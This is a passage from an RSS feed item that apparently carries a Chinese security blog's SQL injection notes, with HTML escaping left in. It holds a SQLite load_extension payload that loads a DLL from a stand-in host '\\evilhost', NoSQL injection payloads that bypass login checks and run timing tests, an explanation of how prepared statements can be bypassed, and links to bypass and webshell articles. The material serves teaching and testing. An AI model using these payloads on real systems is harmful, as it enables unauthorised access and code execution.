comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Load_extension&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;load_extension&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\\evilhost\evil.dll&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;E&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;nosql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql-payload&#34;&gt;#&lt;/a&gt; NoSQL Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-4&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;绕过限制条件
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;: &amp;quot;user&amp;quot;&amp;#125;&lt;/code&gt;  =&amp;gt;  &lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;: &amp;#123;&amp;quot;ne&amp;quot;: &amp;quot;fakeuser&amp;quot;&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;return true&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;测试用字符
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;&amp;quot;\/$[].&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;布尔测试常用
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$ne&amp;quot;: -1&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$in&amp;quot;: []&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;return true&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$or&amp;quot;: [&amp;#123;&amp;#125;,&amp;#123;&amp;quot;foo&amp;quot;:&amp;quot;1&amp;quot;&amp;#125;]&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;时间
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;sleep(100)&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译&#34;&gt;#&lt;/a&gt; 预编译&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL 引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。&lt;/p&gt;
&lt;h2 id=&#34;模拟预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模拟预编译&#34;&gt;#&lt;/a&gt; 模拟预编译&lt;/h2&gt;
&lt;p&gt;为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。&lt;/p&gt;
&lt;h2 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h2&gt;
&lt;h3 id=&#34;预编译使用错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译使用错误&#34;&gt;#&lt;/a&gt; 预编译使用错误&lt;/h3&gt;
&lt;p&gt;预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。&lt;/p&gt;
&lt;h3 id=&#34;部分参数不可预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#部分参数不可预编译&#34;&gt;#&lt;/a&gt; 部分参数不可预编译&lt;/h3&gt;
&lt;p&gt;在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。&lt;/p&gt;
&lt;h3 id=&#34;预编译实现错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译实现错误&#34;&gt;#&lt;/a&gt; 预编译实现错误&lt;/h3&gt;
&lt;p&gt;部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。&lt;/p&gt;
&lt;h1 id=&#34;参考文章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文章&#34;&gt;#&lt;/a&gt; 参考文章&lt;/h1&gt;
&lt;h2 id=&#34;tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tricks&#34;&gt;#&lt;/a&gt; Tricks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cud2lsczBuLmNuL2FyY2hpdmVzLzE3OC8=&#34;&gt;sqlmap time based inject 分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9TUUxJbmplY3Rpb25XaWtp&#34;&gt;SQLInjectionWiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnVjQ055Q215QVRkUkVOWnAwQUYyQQ==&#34;&gt;常见数据库写入 Webshell 汇总&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdUVOdnBQYW43YVZkN01iU29BVDlEZw==&#34;&gt;MSSQL 数据库攻击实战指北&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; Bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZlNCWlBrTzAtSE5ZZkxnbVlXSktDZw==&#34;&gt;SQL 注入 ByPass 的一些小技巧&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY4&#34;&gt;Waf Bypass 之道&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FsZWVuenovTVlTUUxfU1FMX0JZUEFTU19XSUtJ&#34;&gt;MySQL Bypass Wiki&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nosql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql&#34;&gt;#&lt;/a&gt; NoSQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy55dW53ZWlwYWkuY29tL2FyY2hpdmVzLzE0MDg0Lmh0bWw=&#34;&gt;NoSQL 注入的分析和缓解&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdEc4NzRMTlRJZGlON01QdE8taG92QQ==&#34;&gt;NoSQL 注入&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cheatsheet-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cheatsheet-2&#34;&gt;#&lt;/a&gt; Cheatsheet&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0lnbml0ZXRlY2hub2xvZ2llcy9NU1NRTC1QZW50ZXN0LUNoZWF0c2hlZXQ=&#34;&gt;MSSQL Pentest Cheatsheet&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
    </channel>
</rss>
